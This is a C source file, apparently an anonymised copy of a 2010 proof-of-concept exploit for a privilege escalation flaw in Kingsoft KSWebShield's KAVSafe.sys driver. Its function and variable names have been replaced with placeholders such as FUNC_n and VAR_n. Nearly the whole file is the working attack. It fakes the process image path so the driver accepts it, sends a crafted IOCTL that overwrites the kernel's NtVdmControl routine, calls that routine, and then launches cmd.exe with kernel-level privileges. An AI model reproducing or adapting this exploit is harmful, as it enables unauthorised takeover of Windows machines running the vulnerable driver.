
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_14__ TYPE_6__ ;
typedef struct TYPE_13__ TYPE_5__ ;
typedef struct TYPE_12__ TYPE_4__ ;
typedef struct TYPE_11__ TYPE_3__ ;
typedef struct TYPE_10__ TYPE_2__ ;
typedef struct TYPE_9__ TYPE_1__ ;


typedef int sysmod ;
typedef int pbi ;
struct TYPE_12__ {TYPE_3__* Module; } ;
typedef TYPE_4__ X_SYSTEM_MODULE_INFORMATION ;
typedef char WCHAR ;
typedef int USHORT ;
typedef int ULONG ;
struct TYPE_14__ {TYPE_2__* ProcessParameters; } ;
struct TYPE_13__ {scalar_t__ PebBaseAddress; } ;
struct TYPE_11__ {int ImageName; } ;
struct TYPE_9__ {int Length; char* Buffer; } ;
struct TYPE_10__ {TYPE_1__ ImagePathName; } ;
typedef scalar_t__ PVOID ;
typedef TYPE_5__ PROCESS_BASIC_INFORMATION ;
typedef TYPE_6__* PPEB ;
typedef int (* PNT_VDM_CONTROL ) (int ,int ) ;
typedef int (* PNT_QUERY_SYSTEM_INFORMATION ) (int,TYPE_4__*,int,int *) ;
typedef int (* PNT_QUERY_INFORMATION_PROCESS ) (int ,int ,TYPE_5__*,int,int *) ;
typedef int ModuleName ;
typedef int LPBYTE ;
typedef scalar_t__ HMODULE ;
typedef int HKEY ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef char CHAR ;


 int FUNC_0 (scalar_t__) ;
 int FUNC_1 (scalar_t__,scalar_t__,int) ;
 scalar_t__ FUNC_2 (char*,int ,int ,int ,int ,int ,int ) ;
 int FUNC_3 (scalar_t__,int ,scalar_t__,int,int *,int ,int*,int ) ;
 scalar_t__ VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_4 () ;
 scalar_t__ FUNC_5 (char*) ;
 scalar_t__ FUNC_6 (scalar_t__,char*) ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 int VAR_5 ;
 scalar_t__ FUNC_7 (scalar_t__) ;
 int VAR_6 ;
 scalar_t__ VAR_7 ;
 int FUNC_8 () ;
 int VAR_8 ;
 scalar_t__ VAR_9 ;
 int FUNC_9 (int ) ;
 scalar_t__ FUNC_10 (int ,char*,int *) ;
 scalar_t__ FUNC_11 (int ,char*,int *,int*,int ,int*) ;
 int FUNC_12 (scalar_t__,char*,int) ;
 int VAR_10 ;
 int FUNC_13 (char*,int ) ;
 int FUNC_14 () ;
 scalar_t__ FUNC_15 (int) ;
 int FUNC_16 (char*,...) ;
 scalar_t__ FUNC_17 (int ,char) ;
 int FUNC_18 (char*,char*) ;
 int FUNC_19 (char*) ;

int FUNC_20(int VAR_11, char* VAR_12[])
{

FUNC_16("KSWebShield KAVSafe.sys <= 2010,04,14,609\n"
"Kernel Mode Privilege Escalation Vulnerability Proof-of-Concept\n"
"2010-5-23\n"
"By Lincoin \n\nPress Enter");
HKEY VAR_13 ;
WCHAR VAR_14[VAR_6];
DWORD VAR_15 ;
DWORD VAR_16 = VAR_6 * sizeof(WCHAR);
ULONG VAR_17 ;
PVOID VAR_18 = ((void*)0) ;

if (FUNC_10(VAR_3 , "SOFTWARE\\Kingsoft\\KSWSVC", &VAR_13) == VAR_0)
{
if (FUNC_11(VAR_13 , L"ProgramPath" , ((void*)0) , &VAR_15 , (LPBYTE)VAR_14 , &VAR_16) != VAR_0)
{
FUNC_9(VAR_13);
FUNC_16("KSWebShield not installed\n");
FUNC_14();
return 0 ;
}

FUNC_9(VAR_13);
}
else
{
FUNC_16("KSWebShield not installed\n");
FUNC_14();
return 0 ;
}
FUNC_18(VAR_14 , L"\\kavinst.exe");


PROCESS_BASIC_INFORMATION VAR_19 ;

PNT_QUERY_INFORMATION_PROCESS VAR_20 ;
VAR_20 = (PNT_QUERY_INFORMATION_PROCESS)FUNC_6(FUNC_5("ntdll.dll" ) , "NtQueryInformationProcess");
VAR_20(FUNC_8() , 0 , &VAR_19 , sizeof(VAR_19) , ((void*)0));

PPEB VAR_21 ;

VAR_21 = (PPEB)VAR_19.PebBaseAddress;
VAR_17 = VAR_21->ProcessParameters->ImagePathName.Length;
VAR_21->ProcessParameters->ImagePathName.Length = FUNC_19(VAR_14) * sizeof(WCHAR);
VAR_18 = FUNC_15(VAR_21->ProcessParameters->ImagePathName.Length);
FUNC_12(VAR_18,VAR_21->ProcessParameters->ImagePathName.Buffer , VAR_21->ProcessParameters->ImagePathName.Length);
FUNC_12(VAR_21->ProcessParameters->ImagePathName.Buffer , VAR_14 ,VAR_21->ProcessParameters->ImagePathName.Length );
HANDLE VAR_22 = FUNC_2("\\\\.\\KAVSafe" ,
VAR_1 ,
VAR_2 ,
0,
VAR_8 ,
0,
0);

if (VAR_22==VAR_4)
{
FUNC_16("cannot open device %u\n", FUNC_4());
FUNC_14();
return 0 ;
}
FUNC_12(VAR_21->ProcessParameters->ImagePathName.Buffer , VAR_18,VAR_21->ProcessParameters->ImagePathName.Length);
VAR_21->ProcessParameters->ImagePathName.Length = (USHORT)VAR_17 ;

PNT_QUERY_SYSTEM_INFORMATION VAR_23 ;
VAR_23 = (PNT_QUERY_SYSTEM_INFORMATION)FUNC_6(FUNC_5("ntdll.dll") , "NtQuerySystemInformation");
X_SYSTEM_MODULE_INFORMATION VAR_24 ;
HMODULE VAR_25 ;

VAR_23(0xb, &VAR_24, sizeof(VAR_24), ((void*)0));
    VAR_25 = FUNC_7(FUNC_17(VAR_24.Module[0].ImageName, '\\') + 1);
if (VAR_25 == 0 )
{
FUNC_16("cannot load ntoskrnl!\n");
FUNC_14();
return 0 ;
}
PVOID VAR_26 = FUNC_6(VAR_25 , "NtVdmControl");

if (VAR_26 == 0 )
{
FUNC_16("cannot find NtVdmControl!\n");
FUNC_14();
return 0 ;
}
VAR_26 = (PVOID)((ULONG)VAR_26 - (ULONG)VAR_25 );

FUNC_16("NtVdmControl = %08x" , VAR_26 );
FUNC_14();
ULONG VAR_27 = (ULONG)VAR_7 - (ULONG)VAR_9;
ULONG VAR_28 = (ULONG)VAR_9;


PVOID VAR_29 = FUNC_15(0x48 + VAR_27);

FUNC_1((PVOID)((ULONG)VAR_29 + 0x48) , VAR_9 , VAR_27);
CHAR VAR_30[68]= "ntoskrnl.exe" ;
FUNC_12( VAR_29 , VAR_30 , sizeof(VAR_30));
*(ULONG*)((ULONG)VAR_29 + 64) = (ULONG)VAR_26;
*(ULONG*)((ULONG)VAR_29 + 68) = VAR_27 ;
ULONG VAR_31 ;
if (!FUNC_3(VAR_22 ,
VAR_5 ,
VAR_29 ,
0x48 + VAR_27 ,
((void*)0) ,
0,
&VAR_31 , 0
))
{
FUNC_16("cannot device io control!%u\n" , FUNC_4());
FUNC_14();
return 0;
}

FUNC_0(VAR_22);

PNT_VDM_CONTROL VAR_32 = (PNT_VDM_CONTROL)FUNC_6(FUNC_5("ntdll.dll") , "NtVdmControl");
VAR_32(0,0);
FUNC_13("cmd.exe" , VAR_10);
FUNC_16("OK!\n ");

FUNC_14();

return 0;
}
